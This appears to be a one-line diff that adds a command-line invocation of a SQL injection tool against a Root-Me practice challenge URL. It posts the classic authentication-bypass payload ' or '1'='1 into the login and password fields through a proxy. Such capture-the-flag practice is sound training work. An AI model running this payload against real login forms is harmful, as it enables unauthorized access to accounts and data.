@@ -1,0 +1,1 @@
+py -2 main.py -t sqli -u "http://challenge01.root-me.org/web-serveur/ch9/" --post "login=1&password=1" -s "\' or \'1\'=\'1" -p login;password  -o sqlt --proxy
